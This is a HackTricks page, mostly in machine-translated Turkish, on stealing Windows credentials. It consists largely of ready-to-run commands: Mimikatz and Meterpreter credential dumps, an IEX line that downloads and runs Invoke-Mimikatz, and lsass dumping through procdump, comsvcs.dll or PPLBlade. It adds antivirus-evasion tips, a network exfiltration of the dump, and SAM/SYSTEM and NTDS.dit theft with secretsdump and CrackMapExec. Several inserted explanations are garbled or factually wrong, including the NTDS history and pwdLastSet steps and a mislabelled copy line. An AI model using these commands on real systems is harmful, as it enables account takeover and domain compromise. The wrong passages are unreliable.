# Windows Kimlik Bilgilerini Çalma

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman olmak için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> ile öğrenin!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamını görmek isterseniz** veya **HackTricks'i PDF olarak indirmek isterseniz** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek** paylaşın.

</details>

## Kimlik Bilgileri Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Invoke-Mimikatz**

Invoke-Mimikatz, a PowerShell script, is a powerful tool that allows you to extract credentials from a Windows system's memory. It can be used to retrieve passwords, hashes, and other sensitive information stored in memory.

To use Invoke-Mimikatz, you need to have administrative privileges on the target system. Once executed, the script will load the Mimikatz library into memory and perform various operations to extract credentials.

Invoke-Mimikatz can be used to perform the following actions:

- **Pass-the-Hash**: This technique allows you to authenticate to a remote system using the NTLM hash of a user's password, instead of the actual password. This can be useful for lateral movement within a network.

- **Pass-the-Ticket**: This technique allows you to authenticate to a remote system using a Kerberos ticket, instead of a password. This can be useful if you have obtained a valid ticket from another user or service.

- **Golden Ticket**: This technique allows you to create a forged Kerberos ticket that grants you full domain administrator privileges. With a golden ticket, you can impersonate any user or service within the domain.

- **Silver Ticket**: This technique allows you to create a forged Kerberos ticket for a specific service. With a silver ticket, you can impersonate a specific service account and access its associated resources.

- **Skeleton Key**: This technique allows you to inject a malicious DLL into the LSASS process, which enables you to bypass authentication and authenticate as any user without knowing their password.

- **Dumper**: This technique allows you to dump credentials from memory, including passwords, hashes, and Kerberos tickets.

- **Pass-the-Cache**: This technique allows you to authenticate to a remote system using cached credentials, instead of a password. This can be useful if you have physical access to a system or have obtained a copy of the SAM database.

- **DCSync**: This technique allows you to impersonate a domain controller and request password hashes for all domain users. This can be useful for obtaining the NTLM hashes of all domain users without being detected.

Invoke-Mimikatz is a powerful tool that can be used for both legitimate purposes, such as penetration testing, and malicious activities, such as stealing credentials. It is important to use this tool responsibly and with proper authorization.
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Burada bazı olası kimlik bilgileri korumaları hakkında bilgi edinin.**](credentials-protections.md) **Bu korumalar, Mimikatz'ın bazı kimlik bilgilerini çıkarmasını engelleyebilir.**

## Meterpreter ile Kimlik Bilgileri

Kurbanın içindeki şifreleri ve karma değerlerini aramak için oluşturduğum [**Kimlik Bilgileri Eklentisini**](https://github.com/carlospolop/MSF-Credentials) kullanın.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## AV'yi Atlatma

### Procdump + Mimikatz

**SysInternals'ten** [**Procdump**](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**, meşru bir Microsoft aracı** olduğu için Defender tarafından tespit edilmez.\
Bu aracı kullanarak **lsass işlemini dump** edebilir, **damp'ı indirebilir** ve **damp'tan yerel olarak** kimlik bilgilerini **çıkarabilirsiniz**.

{% code title="Lsass'ı Dump Et" %}
```bash
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
{% code title="Dökümden kimlik bilgilerini çıkarın" %}
```c
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
{% endcode %}

Bu işlem [SprayKatz](https://github.com/aas-n/spraykatz) ile otomatik olarak gerçekleştirilir: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Not**: Bazı **AV**'ler, **lsass.exe'yi dump etmek için procdump.exe** kullanımını **zararlı** olarak algılayabilir. Bu, **"procdump.exe" ve "lsass.exe"** dizesini algıladıkları içindir. Bu nedenle, procdump'a lsass.exe'nin **adı yerine PID'sini** argüman olarak **geçmek** daha **gizli** bir yöntemdir.

### **comsvcs.dll** ile lsass'in dump edilmesi

`C:\Windows\System32` dizininde bulunan **comsvcs.dll** adlı bir DLL, bir çökme durumunda **işlem belleğini dump etmekten** sorumludur. Bu DLL, `rundll32.exe` kullanılarak çağrılan **`MiniDumpW`** adlı bir işlev içerir.\
İlk iki argümanın kullanılması önemsizdir, ancak üçüncü argüman üç bileşene ayrılır. Dump edilecek işlem ID'si ilk bileşeni oluşturur, dump dosyasının konumu ikinciyi temsil eder ve üçüncü bileşen sadece **full** kelimesidir. Başka seçenekler yoktur.\
Bu üç bileşenin ayrıştırılmasıyla, DLL dump dosyasını oluşturur ve belirtilen işlemin belleğini bu dosyaya aktarır.\
**comsvcs.dll**'nin kullanımı, lsass işlemini dump etmek için procdump'ı yüklemek ve çalıştırmak gereksinimini ortadan kaldırır. Bu yöntem ayrıntılı olarak [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords) adresinde açıklanmıştır.

Aşağıdaki komut yürütme için kullanılır:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Bu işlemi** [**lssasy**](https://github.com/Hackndo/lsassy)** ile otomatikleştirebilirsiniz.**

### **Task Yöneticisi ile lsass'in Dump Edilmesi**

1. Görev Çubuğuna sağ tıklayın ve Task Yöneticisi'ni seçin.
2. Daha fazla ayrıntıyı göster'i tıklayın.
3. İşlemler sekmesinde "Local Security Authority Process" işlemini arayın.
4. "Local Security Authority Process" işlemine sağ tıklayın ve "Dump dosyası oluştur" seçeneğini tıklayın.

### procdump ile lsass'in Dump Edilmesi

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump), [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) paketinin bir parçası olan Microsoft tarafından imzalanmış bir ikili dosyadır.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## PPLBlade ile lsass'in Dump Edilmesi

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade), bellek dökümünü obfuskasyon yaparak ve diske kaydetmeden uzak çalışma istasyonlarına aktarabilen Korunan Süreç Dökücü Aracıdır.

**Ana işlevler**:

1. PPL korumasını atlatma
2. Bellek döküm dosyalarını Defender imza tabanlı tespit mekanizmalarından kaçınmak için obfuskasyon yapma
3. Bellek dökümünün RAW ve SMB yükleme yöntemleriyle diske kaydetmeden yükleme yapma (dosyasız döküm)

{% code overflow="wrap" %}
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
{% code %}

## CrackMapExec

### SAM hashları çalma
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### LSA sırlarını çalma

Bu teknik, Windows işletim sistemlerindeki LSA (Local Security Authority) sırlarını çalmak için kullanılır. LSA sırları, kullanıcı kimlik bilgileri, oturum açma parolaları ve diğer hassas bilgileri içeren önemli verileri depolar.

Bu teknik, `lsadump` aracı kullanılarak gerçekleştirilir. Bu araç, LSA sırlarını çalmak için çeşitli yöntemler kullanır. Bu yöntemler arasında `lsass` bellek bölgesini okuma, `Security Account Manager (SAM)` veritabanını çözme ve `Registry` anahtarlarını analiz etme bulunur.

Bu teknik, bir saldırganın hedef sisteme erişimi olduğunda kullanılabilir. Saldırgan, LSA sırlarını çalarak kullanıcı kimlik bilgilerine erişebilir ve bu bilgileri kötüye kullanabilir.

Bu teknik, bir sistemdeki güvenlik açıklarını tespit etmek ve düzeltmek için kullanılabilir. Sistem yöneticileri, LSA sırlarını korumak için gerekli önlemleri almalı ve güvenlik açıklarını kapatmalıdır.
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Hedef DC'den NTDS.dit'i dökün

```plaintext
To dump the NTDS.dit file from a target Domain Controller (DC), you can use various methods. Here are a few techniques:

1. **NTDSUtil**: This built-in Windows utility allows you to interact with the Active Directory (AD) database. You can use the following commands to dump the NTDS.dit file:
   ```plaintext
   ntdsutil
   activate instance ntds
   ifm
   create full <path_to_dump_folder>
   quit
   ```

2. **Mimikatz**: This powerful post-exploitation tool can be used to extract credentials from memory. To dump the NTDS.dit file using Mimikatz, follow these steps:
   ```plaintext
   mimikatz
   privilege::debug
   lsadump::lsa /inject /name:ntds
   ```

3. **PowerShell**: You can also use PowerShell to dump the NTDS.dit file. Here's an example script:
   ```plaintext
   $NTDSPath = "C:\Windows\NTDS\NTDS.dit"
   $DestinationPath = "C:\Temp\NTDS.dit"
   Copy-Item -Path $NTDSPath -Destination $DestinationPath
   ```

Remember that dumping the NTDS.dit file requires administrative privileges on the target DC. Additionally, be cautious when handling sensitive data and ensure that you have the necessary permissions to perform these actions.
```
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Hedef DC'den NTDS.dit parola geçmişini dökün

```plaintext
**Description**: This technique allows you to dump the password history stored in the NTDS.dit file on a target Domain Controller (DC). The NTDS.dit file is a database file that stores Active Directory data, including user account information and password hashes.

**Method**: To dump the password history from the NTDS.dit file, you can use tools like `mimikatz` or `secretsdump.py`. These tools can extract the password hashes and other relevant information from the NTDS.dit file.

**Steps**:
1. Obtain administrative access to a machine on the target network.
2. Download and run `mimikatz` or `secretsdump.py` on the machine.
3. Use the appropriate command to dump the password history from the NTDS.dit file. For example, in `mimikatz`, you can use the `lsadump::sam` command.
4. Save the dumped password hashes and analyze them to identify any weak or compromised passwords.

**Note**: Dumping the password history from the NTDS.dit file can be useful for password cracking or auditing purposes. However, it is important to ensure that you have proper authorization and legal permission before performing any hacking activities.
```

```plaintext
**Açıklama**: Bu teknik, hedef bir Etki Alanı Denetleyicisi'ndeki (DC) NTDS.dit dosyasında depolanan parola geçmişini dökmek için kullanılır. NTDS.dit dosyası, Kullanıcı hesap bilgileri ve parola karma değerleri de dahil olmak üzere Active Directory verilerini depolayan bir veritabanı dosyasıdır.

**Yöntem**: NTDS.dit dosyasından parola geçmişini dökmek için `mimikatz` veya `secretsdump.py` gibi araçları kullanabilirsiniz. Bu araçlar, NTDS.dit dosyasından parola karma değerlerini ve diğer ilgili bilgileri çıkarabilir.

**Adımlar**:
1. Hedef ağdaki bir makineye yönetici erişimi elde edin.
2. Makineye `mimikatz` veya `secretsdump.py` indirin ve çalıştırın.
3. NTDS.dit dosyasından parola geçmişini dökmek için uygun komutu kullanın. Örneğin, `mimikatz` kullanıyorsanız `lsadump::sam` komutunu kullanabilirsiniz.
4. Dökülen parola karma değerlerini kaydedin ve zayıf veya tehlikede olan parolaları belirlemek için analiz edin.

**Not**: NTDS.dit dosyasından parola geçmişini dökmek, parola kırma veya denetim amacıyla faydalı olabilir. Ancak, herhangi bir hackleme faaliyeti gerçekleştirmeden önce uygun yetkilendirme ve yasal izinlere sahip olduğunuzdan emin olmanız önemlidir.
```
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Her bir NTDS.dit hesabı için pwdLastSet özniteliğini gösterin

NTDS.dit hesapları için pwdLastSet özniteliğini göstermek için aşağıdaki adımları izleyin:

1. Bir komut istemcisini açın.
2. `ntdsutil` komutunu çalıştırın.
3. `activate instance ntds` komutunu çalıştırın.
4. `ifm` komutunu çalıştırın.
5. `create full C:\path\to\output` komutunu çalıştırın. (Çıktıyı istediğiniz bir yola değiştirin)
6. `quit` komutunu çalıştırın.
7. `quit` komutunu tekrar çalıştırın.

Bu adımları takip ettikten sonra, NTDS.dit hesaplarının pwdLastSet özniteliğini içeren bir çıktı dosyası oluşturulacaktır.
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## SAM ve SYSTEM Çalmak

Bu dosyaların konumu _C:\windows\system32\config\SAM_ ve _C:\windows\system32\config\SYSTEM_ olmalıdır. Ancak bunları korundukları için sıradan bir şekilde kopyalayamazsınız.

### Kayıttan

Bu dosyaları çalmak için en kolay yol, kayıttan bir kopya almak:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Kali** makinenize bu dosyaları **indirin** ve **hash'leri çıkarın** kullanarak:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Bu hizmeti kullanarak korumalı dosyaların bir kopyasını alabilirsiniz. Yönetici olmanız gerekmektedir.

#### vssadmin Kullanımı

vssadmin ikili dosyası yalnızca Windows Server sürümlerinde mevcuttur.
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Ancak aynısını **Powershell** ile yapabilirsiniz. Bu, **SAM dosyasını nasıl kopyalayacağınızın bir örneğidir** (kullanılan sabit disk "C:" ve C:\users\Public'e kaydedilir), ancak bu korumalı herhangi bir dosyayı kopyalamak için kullanabilirsiniz:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Kod kitaptan: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

Son olarak, [**PS betiği Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) kullanarak SAM, SYSTEM ve ntds.dit'in bir kopyasını oluşturabilirsiniz.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Kimlik Bilgileri - NTDS.dit**

**NTDS.dit** dosyası, kullanıcı nesneleri, gruplar ve üyelikleri hakkında önemli verileri içeren **Active Directory**'nin kalbi olarak bilinir. Alan kullanıcılarının **şifre karmaları** burada depolanır. Bu dosya, bir **Genişletilebilir Depolama Motoru (ESE)** veritabanıdır ve **_%SystemRoom%/NTDS/ntds.dit_** konumunda bulunur.

Bu veritabanında üç temel tablo bulunur:

- **Veri Tablosu**: Bu tablo, kullanıcılar ve gruplar gibi nesneler hakkında ayrıntıları depolamakla görevlidir.
- **Bağlantı Tablosu**: Grup üyelikleri gibi ilişkileri takip eder.
- **SD Tablosu**: Depolanan nesnelerin güvenliğini ve erişim kontrolünü sağlayan her nesne için güvenlik tanımlayıcıları burada bulunur.

Daha fazla bilgi için: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows, _Ntdsa.dll_ kullanarak bu dosya ile etkileşimde bulunur ve _lsass.exe_ tarafından kullanılır. Ardından, **NTDS.dit** dosyasının bir **bölümü**, **`lsass`** belleği içinde bulunabilir (performans artışı için bir **önbellek** kullanıldığı için muhtemelen en son erişilen verileri bulabilirsiniz).

#### NTDS.dit içindeki karmaşaların şifrelenmesi

Karma 3 kez şifrelenir:

1. **BOOTKEY** ve **RC4** kullanarak **Şifre Şifreleme Anahtarı (PEK)** şifresini çözme.
2. **PEK** ve **RC4** kullanarak **karma**yı şifre çözme.
3. **DES** kullanarak **karma**yı şifre çözme.

**PEK**, **her etki alanı denetleyicisinde aynı değere** sahiptir, ancak **NTDS.dit** dosyasında **etki alanı denetleyicisinin SYSTEM dosyasının BOOTKEY**'i kullanılarak **şifrelenir**. Bu nedenle, NTDS.dit dosyasından kimlik bilgilerini almak için **NTDS.dit ve SYSTEM** dosyalarına ihtiyacınız vardır (_C:\Windows\System32\config\SYSTEM_).

### Ntdsutil kullanarak NTDS.dit Kopyalama

Windows Server 2008'den bu yana kullanılabilir.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
[**Volume shadow copy**](./#stealing-sam-and-system) hilesini kullanarak **ntds.dit** dosyasını kopyalamak da mümkündür. Unutmayın ki **SYSTEM dosyasının** bir kopyasına da ihtiyacınız olacak (yine, [**kayıttan dökün veya volume shadow copy**](./#stealing-sam-and-system) hilesini kullanın).

### **NTDS.dit'ten hash çıkarma**

**NTDS.dit** ve **SYSTEM** dosyalarını **edinledikten** sonra, _secretsdump.py_ gibi araçları kullanarak **hash'leri çıkarabilirsiniz**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Ayrıca, geçerli bir etki alanı yönetici kullanarak onları otomatik olarak **çıkarabilirsiniz**:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
**Büyük NTDS.dit dosyaları** için, [gosecretsdump](https://github.com/c-sto/gosecretsdump) kullanarak çıkarmak önerilir.

Son olarak, **metasploit modülü** olan _post/windows/gather/credentials/domain\_hashdump_ veya **mimikatz** `lsadump::lsa /inject` kullanabilirsiniz.

### **NTDS.dit'ten domain nesnelerini bir SQLite veritabanına çıkarma**

NTDS nesneleri, [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) ile bir SQLite veritabanına çıkarılabilir. Sadece sırlar çıkarılmaz, aynı zamanda ham NTDS.dit dosyası zaten alındığında daha fazla bilgi çıkarma için tüm nesneler ve özellikleri de çıkarılır.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
`SYSTEM` hive isteğe bağlıdır ancak şifreleri (NT ve LM karmaşaları, açık metin şifreleri gibi ek bilgiler, kerberos veya güven anahtarları, NT ve LM şifre geçmişleri) çözümlemek için kullanılır. Diğer bilgilerle birlikte, aşağıdaki veriler çıkarılır: kullanıcı ve makine hesapları ile karmaşaları, UAC bayrakları, son oturum açma ve şifre değiştirme zaman damgaları, hesap açıklamaları, isimler, UPN, SPN, gruplar ve özyinelemeli üyelikler, örgütsel birimler ağacı ve üyelikleri, güvenilen etki alanları ve güven türü, yönlendirme ve öznitelikler...

## Lazagne

İndirmek için [buradan](https://github.com/AlessandroZ/LaZagne/releases) ikili dosyayı indirebilirsiniz. Bu ikili dosyayı çeşitli yazılımlardan kimlik bilgilerini çıkarmak için kullanabilirsiniz.
```
lazagne.exe all
```
## SAM ve LSASS'tan kimlik bilgilerini çıkarmak için diğer araçlar

### Windows credentials Editor (WCE)

Bu araç, bellekten kimlik bilgilerini çıkarmak için kullanılabilir. İndirme bağlantısı: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

SAM dosyasından kimlik bilgilerini çıkarın.
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

SAM dosyasından kimlik bilgilerini çıkarın
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

İndirin: [http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7) ve sadece **çalıştırın** ve şifreler çıkarılacaktır.

## Savunmalar

[**Bazı kimlik bilgisi korumaları hakkında bilgi edinin buradan.**](credentials-protections.md)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahraman olmak için AWS hacklemeyi öğrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya HackTricks'i **PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'da takip edin.**
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR göndererek paylaşın**.

</details>
